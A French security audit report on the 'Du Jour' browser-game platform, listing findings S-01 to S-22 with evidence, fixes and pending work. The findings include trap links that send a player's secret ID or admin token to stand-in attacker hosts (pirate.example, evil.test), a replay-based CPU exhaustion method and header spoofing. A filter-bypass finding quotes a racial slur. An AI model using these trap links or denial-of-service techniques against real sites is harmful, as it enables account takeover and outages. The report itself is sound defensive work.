# Audit de sécurité de Du Jour — octobre 2026 (lot R7)

Audit du 25/10/2026, commit de départ `e64045b` (`main`), plateforme ouverte au public depuis le 23/10/2026. **Aucun accès à la production, à la recette ni aux consoles** : tout ce qui demande une console est une étape pour Nathan (§ 9). Ce rapport ne contient aucun secret ; quand une valeur sensible est en jeu, il dit où elle est et quoi révoquer.

## Synthèse

1. **Aucun secret dans le code ni dans les 784 commits** (gitleaks sur tout l'historique : 2 faux positifs, des jetons de test ; recherche à part de motifs Google, GitHub, AWS, JWT Turso, clés privées : rien). **Rien à révoquer.**
2. **Aucune XSS** : pas un `innerHTML`, `eval` ni `document.write` dans le code des jeux ; les pseudos sont toujours posés en texte ; `?retour=` n'accepte qu'un chemin du site.
3. **Élevée, corrigée ici** : `?api=https://pirate` faisait envoyer l'identifiant secret du joueur (et le jeton d'admin, pour la page d'administration) à un serveur étranger, sur la production ; le jeton d'admin d'un lien piégé idem. Désormais la production n'accepte que `/`, `demo`, sa propre origine ou la machine locale.
4. **Élevée, corrigée ici** : le site de production publiait `jump/demo/` et `track/demo/` — pour les jours à venir (jusqu'au 30/10), la **rediffusion parfaite du premier**, acceptée par le serveur le jour J. Retirés de la production.
5. **Élevée, corrigée ici** : le plafond de rejeux comptait 1 par rejeu alors qu'une rediffusion qui ne finit jamais coûte 15 fois plus de calcul (mesuré : 200 à 350 ms contre 15 ms) ; il compte désormais la durée. Les lectures du classement n'avaient aucune limite : ajoutée.
6. **Élevée, corrigée ici** : workflows sans `permissions:` (CI et stabilité), **aucune des 68 utilisations d'actions épinglée** (étiquettes mobiles, dans des jobs qui reçoivent la fédération vers Google Cloud) ; épinglées, `permissions` posées, **trois contrôles nouveaux en CI** (`securiteWorkflows.test.ts`).
7. **Élevée, à décider par Nathan (étape manuelle + lot)** : la fédération Google n'est limitée qu'au dépôt ; **toute branche** peut, en modifiant un workflow, déployer en production et lire les secrets de production. Les protections proposées sont au § 5.2.
8. **Administration** : déjà bien gardée côté serveur (jeton Bearer en en-tête, comparaison à temps constant, 10 échecs → blocage jusqu'à la fin de la fenêtre) ; ajoutés ici : journal des actions, avertissement de jeton faible, `X-Robots-Tag`. La déplacer hors du site public est le lot suivant (3 options chiffrées, § 5.1).
9. **Dépôt privé** : au rythme actuel de la CI (**≈ 35 000 minutes facturables par semaine**, 86 000 à 150 000 par mois), le privé coûterait **≈ 500 à 900 $ par mois** sur les exécuteurs de GitHub, et le bouton de validation de « Mettre en production » (relecteurs d'un environnement) **n'existe pas en privé** sans l'offre Enterprise. Recommandation : **rester public pour l'instant**, corriger ce qui est exposé (fait pour l'essentiel), et traiter la recette par une clé d'entrée ; détails § 7.
10. **À retenir** : le code client contient déjà le générateur, la physique et le pilote ; cacher le dépôt ne rend pas les niveaux futurs imprévisibles. Seule une **graine secrète du jour**, révélée à minuit, le fait (lot proposé).

## Sommaire des constats

| N° | Gravité | Constat | État |
|---|---|---|---|
| S-01 | élevée | `?api=` mène l'identifiant secret hors du site | **corrigé** |
| S-02 | élevée | page d'administration : le jeton part vers `?api=` | **corrigé** |
| S-03 | élevée | `demo/` de production : rediffusions parfaites des jours à venir | **corrigé** |
| S-04 | élevée | rejeu malveillant : coût CPU sous-estimé par le plafond | **corrigé** (reste : lot) |
| S-05 | élevée | classement et fantômes de Track sans limite de lecture | **corrigé** |
| S-06 | élevée | workflows : actions non épinglées, CI sans `permissions:` | **corrigé** |
| S-07 | élevée | fédération Google limitée au dépôt (toute branche déploie la production) | **à décider** (étape + lot) |
| S-08 | moyenne | niveau figé de demain (avec la preuve de l'auteur) servi par Hosting | lot proposé |
| S-09 | moyenne | recette ouverte à tous (fonctions à venir, jours à venir, écriture en base) | **partiel** (noindex) + lot |
| S-10 | moyenne | l'administration est publique à `/track/admin/` | **partiel** + lot |
| S-11 | moyenne | pas d'en-têtes de sécurité (Hosting et API) | **partiel** (en-têtes simples) + lot CSP |
| S-12 | moyenne | identifiant secret stocké en clair en base | lot proposé |
| S-13 | moyenne | adresse de connexion et `clientKey` falsifiables en appel direct à `run.app` (R5, risque connu) | lot proposé |
| S-14 | moyenne | comptes en masse, mémoire de la carte des morts | lot proposé |
| S-15 | moyenne | jeton Turso Read & Write sans expiration ; `GCP_SA_KEY` possible | étape manuelle |
| S-16 | moyenne | robots et TAS : aucune plausibilité des entrées | lot proposé |
| S-17 | moyenne | `?semaine=` (Jump, lot 19) calcule les 7 prochains niveaux, sans garde | lot proposé |
| S-18 | moyenne | ménage de `rate` : balayage complet de la table à chaque première clé | **corrigé** |
| S-19 | faible | `?player=` accepté (transition de DailyTrack, retouche 32b) | lot déjà prévu |
| S-20 | faible | journal d'administration absent | **corrigé** |
| S-21 | faible | pseudos : homoglyphes (cyrillique), leet-speak | lot proposé |
| S-22 | faible | divers (en-tête `Host`, dépendances de développement, Docker, e-mail dans deux commits, licence) | notes |

Ce qui est **bien** : requêtes préparées partout (aucune injection), validation stricte des entrées, corps limités à 400 ko et lus en flux, erreurs sans détail pour le client, journaux sans pseudo, identifiant ni adresse, routes de recette (`/api/sonde/entetes`, Garage ouvert, horloge de test, `SALON_MINUTES`) refusées en production par la configuration, base de recette séparée et vérifiée par son nom, CORS par liste d'origines.

## 1. Méthode et limites

- **Lu** : tout `apps/api/src`, les simulations pour le coût d'un rejeu, tous les workflows, `firebase.json`, `scripts/site.mjs`, le code des trois applications (recherche de `innerHTML` et équivalents, paramètres d'adresse, stockage), le site de production assemblé.
- **Mesuré** : coût CPU des rejeux (scripts vitest/esbuild dans le dossier temporaire, SQLite en mémoire) ; CSP essayée dans Chromium sur le site de production assemblé (portail, deux jeux, mentions, 404, admin) ; niveaux futurs recalculés avec le code de l'étiquette `prod-2026-10-25-0933` ; minutes de CI par `gh api` (2 145 runs et leurs jobs).
- **Outils** : gitleaks (installé hors du dépôt, dans le dossier de session, par `go install` ; justification : seul outil qui lit tout l'historique avec des règles maintenues ; aucune installation durable) ; `npm audit` ; `git ls-remote` pour les empreintes des actions.
- **Non vérifié** (aucun accès) : réglages du dépôt GitHub (protection de `main`, environnements, droits d'Actions par défaut), consoles Google Cloud et Turso (rôles réels, condition de la fédération, jetons), comportement réel de Firebase Hosting avec les nouveaux en-têtes, lignes lues facturées par Turso, Firefox et WebKit pour la CSP, tarifs de Cloud Run (valeurs de mémoire, non relues sur la page).

## 2. Constats d'identité, de triche et de serveur

### S-01 — `?api=` envoie l'identifiant secret à un serveur étranger (élevée, corrigé)
- **Preuve** : `apps/web/src/api.ts` `apiBase` (avant ce lot) : `const base = fromUrl || env` — `?api=` prime sur la construction, sans filtre ; `apps/jump/src/rankApi.ts` `rankApiBase` idem. Mesuré par l'audit du client sur un build de production, avec un serveur espion : `GET /api/me` avec `x-player-id=<32 hexadécimaux>` reçu par l'espion pour Track et pour Jump ; le serveur espion répond au pré-vol CORS.
- **Scénario** : `https://playdujour.com/track/?api=https://pirate.example` envoyé par message. La victime ouvre le lien ; le jeu parle au serveur du pirate avec son identifiant ; le pirate le rejoue ensuite sur le vrai serveur (temps, pseudo, « Changer mon code » : il enferme la victime dehors).
- **Correction faite** : `packages/profile/src/apiAdresse.ts` (`apiFromAddress`) ; Track (`apiBase`, `adminApiBase`) et Jump (`rankApiBase`, `BUILD_RESTRICTED` = `VITE_PRODUCTION=1`) : sur la production, `?api=` n'est honoré que s'il vaut `/`, `demo`, l'origine de la page ou la machine locale. Recette, aperçus et développement : inchangés.
- **Vérification** : `packages/profile/test/apiAdresse.test.ts` (12 adresses piégées dont `https://playdujour.com@pirate.example`, `//pirate.example`, `http://playdujour.com`), `apps/web/test/api.test.ts`, `apps/jump/test/classement.test.ts`. Ceinture proposée : la CSP `connect-src 'self'` (§ 6, lot « CSP stricte »).

### S-02 — La page d'administration envoie le jeton vers `?api=` (élevée, corrigé)
- **Preuve** : `apps/web/src/adminPlanning.ts` `computeBase` et `adminMedailles.ts` (avant ce lot) : `?api=` d'abord ; le jeton d'administration (`localStorage["cdj:admin-token"]`) part en `Authorization: Bearer` vers cette adresse dès l'ouverture. Mesuré : `/track/admin/?api=http://evil.test:9001` avec un faux jeton enregistré → l'espion reçoit `GET /api/admin/overview` avec l'en-tête.
- **Scénario** : lien piégé envoyé à Nathan, qui a déjà un jeton enregistré dans ce navigateur.
- **Correction faite** : `adminApiBase` (même règle que S-01, appliquée aussi à l'adresse mémorisée dans `cdj:admin`).
- **Reste** : le jeton vit en clair dans `localStorage`, à l'origine partagée de `playdujour.com` (une XSS n'importe où le volerait) → lot « Administration hors du site public » (§ 5.1).

### S-04 — Un rejeu malveillant coûte 15 fois le calcul prévu (élevée, corrigé)
- **Preuve** : `packages/sim/src/replay.ts:12` et `packages/jump-sim/src/replay.ts:49` : 72 000 pas permis (10 min). Une rediffusion « voiture immobile » de **38 caractères** passe les contrôles bon marché (jour, version, circuit public, pseudo) puis fait rejouer 72 000 pas. Mesuré (SQLite en mémoire, Node 22) : Track 205 à 305 ms, Jump 190 à 245 ms, zigzag de 72 000 séries (384 ko) 350 ms ; une course normale (≈ 4 200 pas) 15 ms. Le rejeu est synchrone : il bloque la boucle d'événements. Le plafond de R5 (600 rejeux par minute et par instance) supposait 20 à 30 ms : 600 × 0,25 s = 150 s de calcul par minute, soit 2,5 fois un vCPU.
- **Scénario** : quelques adresses (60 envois par 10 min chacune par Firebase, 600 en appel direct) suffisent à saturer une instance : latences, 503 `busy` pour les vrais joueurs, facture de calcul (≈ 100 à 130 $/mois pour deux instances occupées en continu, estimation grossière sur les tarifs publics de Cloud Run).
- **Correction faite** : `apps/api/src/replayCost.ts` — le plafond compte une unité par `REPLAY_TICKS_PER_UNIT` = 5 000 pas rejoués (une course normale : 1 ; la pire rediffusion : 15). Appliqué à Track, au Salon et à Jump (les vies de Jump comptaient déjà par lot). Le calcul maximal tombe à ≈ 10 s par minute et par instance.
- **Vérification** : `apps/api/test/auditR7.test.ts` (rediffusion de 72 000 pas → 422 puis 503 `busy` avec `Retry-After` ; une vraie course passe encore ; la minute suivante tout repart).
- **Reste (lot « Rejeu borné »)** : arrêt du rejeu d'une voiture immobile ou sans progrès (modification de `packages/sim`, golden à vérifier), plafond de pas plus bas (3 à 5 min), rejeu dans un `worker_thread` avec délai d'expiration.

### S-05 — Lectures du classement et des fantômes de Track sans limite (élevée, corrigé)
- **Preuve** : `apps/api/src/cdj.ts` (route `/api/day/<date>/leaderboard|ghost`) : aucun `readHit`. 600 requêtes d'une même adresse = 600 réponses 200, alors que `GET /api/jump/day/…/board` refuse la 121ᵉ. Chaque `leaderboard` compte les temps du jour ; `ghost?kind=ahead` fait un `LIMIT 1 OFFSET n` ; les réponses sont `no-store` (le cache de Firebase ne protège pas). Mesuré : 2,4 ms de CPU à 50 000 joueurs ; sur Turso, ≈ N lignes lues par requête (non mesuré).
- **Correction faite** : `BOARD_READS_PER_CLIENT` = 300 par adresse et par fenêtre de 10 min (en mémoire, comme les lectures de Jump), 429 avec `Retry-After`. 300 est volontairement large : un joueur recharge au plus quelques fois par minute, une salle de classe derrière une même adresse aussi.
- **Vérification** : `auditR7.test.ts` (300 lectures passent, la 301ᵉ est refusée pour le classement **et** le fantôme — même compteur —, une autre adresse n'est pas touchée, la fenêtre suivante repart).
- **Reste** : un cache mémoire de 5 à 10 s du classement et de son décompte (lot « Lectures et cache »).

### S-12 — L'identifiant secret est stocké en clair en base (moyenne, lot)
- `players.id`, `results.player_id`, `jump_results`, `jump_lives`, `salon_runs.player_id` portent l'identifiant tel que le joueur l'envoie ; seuls `rate` et `salon_presence` sont hachés (HMAC salé). **Une fuite de la base ou du jeton Turso donne tous les comptes.** Le code de transfert `CDJ2.<id>.<CRC-32>` n'ajoute aucune sécurité (le CRC est une somme de contrôle, pas un secret).
- Correction proposée : clé de base = HMAC(secret du serveur, identifiant), avec migration (lot « Identifiants hachés », M).

### S-13 — Adresse falsifiable en appel direct (moyenne, risque R5 connu)
- `node-server.ts` : avec `TRUST_PROXY=2`, `clientKey` est l'entrée de `X-Forwarded-For` que l'appelant écrit en appel direct à `run.app`. Variantes de déni : brûler le quota d'une victime ou verrouiller l'administration en écrivant l'adresse de Nathan (10 faux jetons).
- Fermé en partie par R5 (adresse de connexion) et ici : **l'adresse de connexion (en mémoire) est maintenant comptée avant l'écriture en base** (`hitAddress`), donc un flot d'adresses inventées n'écrit plus de compteur.
- Correction de fond : couper l'accès direct à `run.app` (entrée « internal et équilibreur » avec un domaine devant Cloud Run) — incompatible avec Firebase Hosting aujourd'hui (R5 § 2). Lot « Entrée unique », M.

### S-14 — Comptes en masse, mémoire de la carte des morts (moyenne, lot)
- Un compte se crée avec un identifiant aléatoire et une rediffusion valide (la preuve de l'auteur est publique). `jumpLives.compute` charge en mémoire toutes les lignes `jump_lives` du jour (≈ 4 ko par joueur : 50 000 joueurs ≈ 200 Mo sur 512 Mo). Correction : plafond de créations de joueurs par adresse et par heure, agrégation en SQL (lot « Comptes en masse », M).

### S-16 — Robots et TAS (moyenne, lot)
- **État** : le serveur rejoue la rediffusion avec le même code que le jeu et n'accepte que le temps qu'il a recalculé : **aucun moyen de faire accepter un temps faux** (vérifié sur Track, Salon, Jump, vies). Mais il n'y a **aucun contrôle de plausibilité** : un robot, un TAS ou un solveur qui bat l'auteur est accepté. Le circuit du jour est calculable à l'avance par tous (§ 6), le pilote de Track (`runPilot`, `bestPilotRun`) est exporté par le paquet (mesuré : 37 544 ms le 25/10, égal à l'auteur, accepté rang 1 ; à partir du 28/10, les médailles recalibrées du lot 35 le placent sous le bronze), la preuve de l'auteur de Jump est dans le niveau.
- **Défenses raisonnables** (aucune n'arrête un TAS soigneusement « humanisé » ; ne rien promettre) : (1) **signaler sans bloquer** — séries d'entrées inhumaines (changements de commande par seconde en continu, valeurs analogiques parfaites sur toute la course), temps très en dessous du pilote ; (2) **dédupliquer** les rediffusions identiques entre comptes (copie du fantôme du premier) ; (3) une colonne d'indicateurs et la revue manuelle du haut du classement depuis l'administration ; (4) plus tard, une catégorie « vérifiée ». Lot « Plausibilité des entrées », M.

### S-19 — `?player=` encore accepté (faible, lot déjà prévu)
- `cdj.ts:281-294` : l'identifiant dans l'adresse (journaux de requêtes, 30 jours) pour `leaderboard`, `ghost`, Salon. Aucun client actuel ne l'envoie (recherche dans `apps/web`, `apps/jump`, `packages/profile`, `apps/portail`) ; seuls d'anciens onglets. La retouche 32b le retire ; en attendant, un 400 serait possible.

### Identité — réponses aux questions de l'audit
- Génération : `crypto.getRandomValues`, 128 bits (`packages/profile/src/identity.ts`). Transport : en-tête `X-Player-Id` (jamais l'adresse, sauf S-19). Énumération impraticable (404 inconnu / 410 révoqué / 200, limites par joueur et par adresse). Oracles mineurs (`GET /api/name` avec identifiant, `id_taken` de `POST /api/me/code`) : il faut deviner 128 bits.
- Quiconque détient l'ancien code peut le remplacer et enfermer le propriétaire dehors, sans recours (pas de canal de récupération) : risque de conception, à connaître.

### Validation des entrées, SQL, déni de service — résultats
- Identifiant `^[0-9a-f]{32}$` (minuscules), dates strictes (`%00` → 400), corps JSON objet, `__proto__` sans effet, JSON de 200 000 niveaux de profondeur → `invalid_json`, 401 ko → 413 (lecture en flux, 400 000 octets), `limit` borné 1–50, `refs` ≤ 8.
- **Injection SQL : aucune.** Les `${}` dans le SQL sont des listes de `?` (`players.ts`, `portail.ts`), la constante `ORDER` du Salon et le fragment constant `AND p.demo = 0` (`cdj.ts`).
- Cartes en mémoire bornées par fenêtre ; pas de délai applicatif (Cloud Run coupe à 30 s) ; un en-tête `Host` invalide donne une 500 journalisée (bruit, faible).

### Autres constats du serveur et des pages

- **S-03 (élevée, corrigé)** — `jump/demo/` (jours 27 à 30/10) et `track/demo/` (26/10) étaient copiés tels quels dans le site de production (`scripts/site.mjs`), en 200 sur `playdujour.com`. Chaque fichier d'un jour à venir porte `first.replay` / `ghost.replay` : pour Jump, **identique à la preuve de l'auteur** du niveau que la production générera ce jour-là (comparaison `===` avec `dailyLevel(jour).code`) ; envoyée au serveur avec l'horloge du jour J : 200, rang 1, médaille `author` (3 405, 3 577, 3 613 et 3 624 pas pour les 27, 28, 29 et 30/10) ; Track : 200, rang 1. La veille : 404 / 409. **Corrigé** : `retirerDemos` (`site.mjs --production`) retire `track/demo` et `jump/demo` de la production ; la démonstration reste dans la recette et les aperçus. Test : `apps/portail/test/site.test.ts`.
- **S-08 (moyenne, lot L-FUT)** — `playdujour.com/jump/levels/2026-10-26.json` répond 200 la veille (6 665 octets, identique au dépôt) : le **niveau complet et sa preuve** (`preuve`, 223 caractères) ; le serveur, lui, refuse le jour futur (`GET /api/jump/day/2026-10-26` → 404). La PR « robot » des jours figés les publie aussi dans le dépôt public. Contrepartie du correctif : le chargement du niveau dépend plus de l'API.
- **S-11 (moyenne, partiel)** — aucun en-tête de sécurité ni pour Hosting (`firebase.json` ne posait que du cache) ni pour l'API. **Fait** : sur tout le site `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `X-Frame-Options: DENY`, `Permissions-Policy` (caméra, micro, géolocalisation, paiement, USB, Bluetooth, série, HID retirés), `Content-Security-Policy: frame-ancestors 'none'; base-uri 'self'; object-src 'none'; form-action 'self'` ; sur toutes les réponses de l'API (`SECURITY_HEADERS`, `api.ts`) `nosniff`, `default-src 'none'; frame-ancestors 'none'`, `Referrer-Policy: no-referrer`. Tests : `site.test.ts`, `auditR7.test.ts`. **Reste** : la CSP stricte (Annexe), lot L-CSP.
- **S-17 (moyenne, lot L-SEM)** — dans `main` (pas encore en production), `?semaine=<date>` calcule dans le navigateur les 7 niveaux suivant n'importe quelle date, avec miniatures et morceaux, sans garde ; `outils/semaine-g13.json` couvre 28 jours (27/10 au 23/11, générateur g13). À réserver aux constructions hors production avant la prochaine mise en production. Les autres options d'adresse de debug : `?debug&tune` reste actif en production (courses non classées), `?solution` montre la preuve de l'auteur du niveau du jour (à confirmer par Nathan : voulu ?).
- **S-18 (moyenne, corrigé)** — `platform.ts` : `DELETE FROM rate WHERE bucket < ?` à chaque première requête d'une clé ; la clé primaire est `(key, bucket)`, donc `SCAN rate` : mesuré 3,7 ms et autant de lignes lues pour 100 000 lignes, coût quadratique avec le trafic (des `X-Player-Id` aléatoires gonflent la table). **Corrigé** : une fois par fenêtre et par instance ; et l'adresse de connexion (en mémoire) est comptée avant d'écrire en base.
- **S-20 (faible, corrigé)** — voir § 3 (journal d'administration).
- **S-21 (faible, lot L-PSD)** — `аdmin` (cyrillique), `fuсk`, `n1gger`, `f.u.c.k` passent `cleanName` / `nameKey` : usurpation de pseudo possible (« Nathan » avec un `а` cyrillique) ; le tableau des pseudos réservés n'est pas robuste aux confusables.
- **S-22 (faible)** — un en-tête `Host` invalide lève dans `node-server.ts` (500 journalisée) ; `GET /api/health` (sans limite, un aller-retour en base, révèle version et SHA) ; deux commits portent l'adresse e-mail personnelle de Nathan comme auteur ; pas de licence ; `npm audit` : 4 alertes **hautes en développement seulement** (`wrangler` → `miniflare` → `undici`/`sharp` ; Cloudflare Workers n'est pas utilisé), 0 en production ; `node:22-slim` du Dockerfile non épinglé par empreinte (utilisateur `node`, pas de root : bien) ; le helper `el()` de `packages/ui/src/dom.ts` fait `setAttribute(clé, valeur)` : aujourd'hui les clés sont constantes, une règle de lint empêcherait une régression ; le premier chargement de `/track/admin/` charge `style=` en ligne.

## 3. Administration (constats du serveur)

- Routes : `GET /api/admin/overview`, `GET /api/admin/medailles`, `PUT|DELETE /api/admin/planning/<date>`, `POST /api/admin/effacer` (+ tout autre chemin `/api/admin/*` : 401 sans jeton, 404 avec). Désactivées (404) si `ADMIN_TOKEN` fait moins de 16 caractères.
- Authentification (`requireAdmin`, `cdj.ts`) : `Authorization: Bearer <jeton>` seulement ; `?token=` est **ignoré** (testé : 401) ; comparaison des empreintes SHA-256 octet par octet sans arrêt ; 10 échecs par fenêtre de 10 min et par adresse → 429 y compris pour le bon jeton jusqu'à la fin de la fenêtre ; chaque requête d'administration compte aussi sur l'adresse de connexion (100 par fenêtre).
- **Faite ici** : `log("WARNING", "admin : jeton refusé")`, `admin : circuit remplacé` / `rétabli` avec la date (jamais le jeton, l'adresse ni le pseudo — testé) ; au démarrage, un `ADMIN_TOKEN` de moins de 16 caractères (administration désactivée sans bruit) ou de moins de 32 est signalé dans le journal avec sa seule longueur.
- **Limite** : la fenêtre est fixe (pas de blocage croissant) et sa clé est `clientKey`, falsifiable en appel direct (S-13).

## 4. Chaîne de livraison

### S-06 — Actions non épinglées, CI sans `permissions:` (élevée, corrigé)
- **Preuve (avant)** : 68 `uses:` externes — 23 `actions/checkout@v4`, 14 `setup-node@v4`, 14 `google-github-actions/auth@v3`, 5 `upload-artifact`, 4 `download-artifact`, 4 `setup-gcloud`, 3 `cache`, 1 `deploy-cloudrun` — toutes par étiquette mobile. `ci.yml` et `stabilite.yml` sans bloc `permissions:` (droits par défaut du dépôt).
- **Scénario** : une action compromise (ou une étiquette déplacée) s'exécute dans des jobs qui reçoivent la fédération Google (`id-token: write`) ou `ROBOT_TOKEN`.
- **Corrigé** : toutes épinglées par l'empreinte du commit sur lequel l'étiquette pointait (`git ls-remote`, résultat identique au comportement d'avant) avec le commentaire de version (`# v4.4.0`) ; `permissions: contents: read` sur `ci.yml` et `stabilite.yml` ; deux interpolations d'entrées dans des `run:` de `deploy-site.yml` passées par `env:`.
- **Nouveaux contrôles** (`scripts/securite-workflows.mjs`, `apps/web/test/securiteWorkflows.test.ts`, lancés par le job `unit` de la CI) : `permissions:` au niveau du workflow, jamais `write-all` ; aucun `pull_request_target` ; toute action externe épinglée par 40 hexadécimaux avec version ; liste des écritures permises par workflow (`id-token`, `contents`, `pull-requests`, `actions` seulement où il le faut) ; aucune donnée d'un tiers (`github.head_ref`, `inputs.*`, `github.event.*`) interpolée dans un `run:`.
- **Entretien** : sans Dependabot, des empreintes vieillissent ; Dependabot « version updates » pour `github-actions` est dans le lot « Chaîne de livraison » (étape manuelle § 9, il crée les PR de mise à jour des empreintes).
- **Autres constats, sans correction** : aucun `pull_request_target` (déjà sûr) ; les PR venues d'un fork n'ont ni secret ni jeton d'identité (`apercu.yml` les écarte aussi par `HEAD_REPO`) ; `production.yml` ne se lance qu'à la main, sur `main`, refuse sans CI complète ; le dépôt n'a qu'un seul collaborateur (admin) ; `npm ci` des jobs de déploiement avec scripts (le Dockerfile utilise `--ignore-scripts`) : faible.

### S-07 — La fédération Google ne vérifie que le dépôt (élevée, à décider)
- **Preuve** : `docs/plateforme/recette.md:85-91` — condition du fournisseur `assertion.repository=='Nathan-Te/DailyTrack'` ; le compte `cdj-deploy` a `roles/run.admin`, `roles/artifactregistry.writer`, `roles/firebasehosting.admin` **sur le projet** (`domaine.md:53-60`) et agit comme le compte d'exécution de production (`iam.serviceAccountUser`). Le document le reconnaît (« une branche du dépôt pourrait, en modifiant un workflow, déployer en production »).
- **Scénario** : une branche (ou un jeton de poussée volé, ou un agent trompé par une injection de consigne) ajoute un workflow qui obtient le jeton `cdj-deploy`, puis : déploie un service Cloud Run qui monte les secrets de production (jeton Turso Read & Write, jeton d'administration) ou publie un site de production modifié. Les « validations » de l'environnement `production` ne protègent que le chemin normal.
- **Atténuations proposées** (étapes § 9.2, lot « Séparer recette et production ») :
  1. Condition de la fédération : ajouter `assertion.repository_id` (anti-recréation du dépôt) — sans risque, tout de suite.
  2. Un **second compte de déploiement réservé à la production**, utilisable seulement par les jobs de l'environnement GitHub `production` (condition `assertion.sub=='repo:Nathan-Te/DailyTrack:environment:production'`), l'environnement étant **limité à la branche `main`** ; `cdj-deploy` (recette) perd les droits sur les ressources de production (Cloud Run : rôle au niveau du service ; Artifact Registry : au niveau du dépôt d'images ; secrets : rien).
  3. Firebase Hosting n'a pas de rôle par site : pour séparer vraiment le site de production il faut **un second projet Google** pour la recette (M à L).
- **Résiduel** tant que (3) n'est pas fait : un workflow de branche peut publier sur le site de production. Le risque dépend de qui peut pousser sur le dépôt : aujourd'hui Nathan et les sessions de ses agents.

### S-15 — Jetons et clés longue durée (moyenne, étape manuelle)
- Jeton Turso de production : Read & Write, **expiration jamais** (`docs/mise-en-ligne.md:115`, `recette.md:32`) ; stocké dans Secret Manager. Les workflows prévoient aussi `GCP_SA_KEY` (clé de compte de service longue durée) en repli de la fédération : **si ce secret existe, le supprimer**. `ROBOT_TOKEN` (jeton personnel à droits d'écriture) : vérifier qu'il est limité à ce dépôt et à `contents` + `pull requests`.

## 5. Administration et recette accessibles à tous

### 5.1 L'administration

**Faits.** La page est `https://playdujour.com/track/admin/` (`apps/web/admin/index.html`, publiée avec Track). Elle n'est liée depuis aucune page publique (portail, jeux, vitrine) ; elle porte `<meta name="robots" content="noindex">`. Elle charge uniquement `/track/assets/*` (aucun hôte extérieur), exige un `<style>` en ligne (la seule page du site à en avoir un). Elle expose sans jeton : la page, son code (la liste des routes `/api/admin/*`). **Elle ne donne rien sans le jeton** : chaque route passe par `requireAdmin` (§ 3). Le jeton est saisi dans un champ, envoyé en `Authorization: Bearer` (jamais dans l'adresse), gardé en clair dans `localStorage["cdj:admin-token"]` — à l'origine partagée de `playdujour.com`. Rotation : manuelle (`gcloud secrets versions add cdj-admin-token`), jamais exigée.

**Fait dans ce lot** : S-02 (le jeton ne part plus vers une autre origine) ; `X-Robots-Tag: noindex, nofollow, noarchive` sur `/track/admin/**` (`firebase.json`) ; journal des actions ; avertissement de jeton faible ; page sans lien public (déjà). La page **reste** en production : Nathan s'en sert.

**Cacher l'adresse n'est pas une protection** : le seul rempart est le serveur ; il est solide pour un jeton fort (≥ 32 caractères aléatoires — `openssl rand -hex 24` en donne 48) mais le jeton traverse le navigateur et reste en clair en `localStorage`.

**Lot suivant (« Administration hors du site public »)** — trois options, chiffrées :

| | A. Service Cloud Run d'administration séparé, derrière l'identité Google (IAP ou « invoker » IAM) | B. Outil en ligne de commande lancé depuis l'ordinateur de Nathan | C. Même page, mais derrière une clé d'entrée du site |
|---|---|---|---|
| Idée | Un petit service `cdj-admin` sert **seulement** la page d'administration (le même code), appelle l'API avec le jeton gardé côté serveur ; accès par le compte Google de Nathan | `npm run admin -- planning 2026-11-20 --variant 2` : le script lit le jeton dans le gestionnaire de secrets de Google (`gcloud secrets versions access`) avec le compte Google de Nathan | La page garde son adresse mais l'API d'administration exige aussi un second secret (clé), servie par un en-tête |
| Niveau de protection | Fort : le jeton n'est jamais dans un navigateur ; un inconnu ne voit **même pas la page** ; tout est journalisé par Google (Cloud Audit Logs) | Fort : rien n'est exposé ; accès = être connecté à `gcloud` ; pas de page | Moyen : un secret de plus à saisir, mêmes limites que le jeton actuel |
| Coût | ≈ 0 à 1 $/mois (Cloud Run à zéro instance ; IAM « invoker » gratuit ; IAP derrière un équilibreur ≈ 18 $/mois — **ne pas prendre l'IAP avec équilibreur**, l'option « invoker » suffit pour un seul utilisateur) | 0 $ | 0 $ |
| Mise en place | M (1 à 2 jours) : second service dans `deploy-api.yml`, image de la page, droit `roles/run.invoker` pour Nathan, `gcloud run services proxy` ou jeton d'identité | S à M (1 jour) : réécrire les appels de `adminBackend.ts` en script ; perd le panneau visuel (miniatures, cartes) | S (0,5 jour) |
| Ce qui change pour Nathan | Ouvre `gcloud run services proxy cdj-admin --region europe-west1` puis `http://localhost:8080` (ou une adresse protégée par son compte Google) ; **plus de jeton à saisir** ; le panneau reste visuel | Plus de panneau ; des commandes ; idéal pour effacer un joueur et les médailles, moins pour le planning visuel | Une clé de plus ; la page reste publique |

Recommandation : **A, en variante « invoker » (sans équilibreur)**, car Nathan prévoit de modifier le panneau : il garde son interface, et ses évolutions n'élargissent plus la surface publique. Garder B pour les opérations rares (effacement). Détail de mise en place : lot proposé « L-ADM » (§ 8).

### 5.2 La recette (`recette.playdujour.com` et aperçus de PR)

**Ce qu'un inconnu y voit et peut faire** (faits : `apps/web/src/access.ts`, `deploy-site.yml`, `deploy-api.yml`, `portailDemo.ts`) :
- le site est `main` **entier**, construit **sans** `VITE_PRODUCTION` : donc les fonctions fusionnées mais pas encore mises en production (aujourd'hui : le lot 19 de Jump et son outil `?semaine=`, générateur g14 alors que la production est en g12), les **outils de date de Track** (touches N et T, `?seed=` d'un jour à venir, `?variant=`, `?theme=`, `?today=` avec `?debug`), la **vitrine `/ui/`**, le **lien de démonstration du portail** (`/?demo=joueur`, identité d'un joueur « Démo » connue de tous), le Garage ouvert aux joueurs de démonstration ;
- les **niveaux figés** de Jump de `main` (déjà dans le dépôt), les **jours à venir de Jump jouables** (mode « futur », aperçu seulement) ;
- l'API de recette (`cdj-api-recette`) est ouverte (`--allow-unauthenticated`) : **n'importe qui peut y créer des joueurs, envoyer des temps valides, changer des pseudos et des codes**, ou lire la sonde `/api/sonde/entetes` (qui renvoie ses propres en-têtes). La base est celle de la recette (séparée de la production par le nom, vérifié par `config.ts`) ;
- les adresses `recette.playdujour.com` et les aperçus (`…--pr-N-<empreinte>.web.app`) sont **découvrables** (transparence des certificats pour le premier ; commentaires sur les PR publiques pour les seconds).

**Coût si on la martèle** : Cloud Run de recette `max-instances=1`, 1 vCPU, 512 Mi, concurrence 40 → au pire un vCPU occupé en continu ≈ 2,6 millions de vCPU-secondes par mois ≈ **60 $/mois** (tarif de mémoire : 0,000024 $ par vCPU-seconde et 0,0000025 $ par Gio-seconde, 180 000 / 360 000 offerts — **à confirmer sur la page de tarifs**) ; la production, avec deux instances, ≈ 120 $/mois dans le même cas. Turso : forfait Developer 4,99 $ avec 2,5 milliards de lignes lues et 25 millions écrites (page <https://turso.tech/pricing>, consultée le 25/10/2026 ; le dépassement est facturé, les conditions exactes ne sont pas lisibles sur la page). Les limites de débit sont **les mêmes** que la production (constantes du code) ; le plafond de rejeux, désormais proportionnel à la durée, s'applique aussi.

